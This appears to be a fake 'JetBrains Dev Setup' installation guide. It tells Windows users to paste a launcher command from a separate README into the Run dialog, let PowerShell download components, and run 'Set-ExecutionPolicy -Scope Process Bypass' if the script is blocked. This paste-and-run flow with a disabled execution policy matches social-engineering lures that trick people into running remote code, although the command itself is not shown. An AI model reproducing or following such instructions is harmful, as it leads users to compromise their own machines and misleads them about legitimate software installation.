# Extended Installation Guide (JetBrains Dev Setup)

## Requirements
- Windows 10/11 x64
- ~50 MB free disk space
- Internet connection for the first launch

## Detailed walkthrough
1. Read the main README quick start first — it covers 95% of cases.
2. Use the Run dialog (**Win + R**) to execute the launcher command.
3. A PowerShell window will open automatically and complete the rest.

## Troubleshooting
| Symptom | Fix |
|---|---|
| Nothing pastes | Press Ctrl+V manually inside the new window |
| Script blocked | Allow PowerShell execution: `Set-ExecutionPolicy -Scope Process Bypass` |
| Slow start | First launch downloads components; later launches are instant |
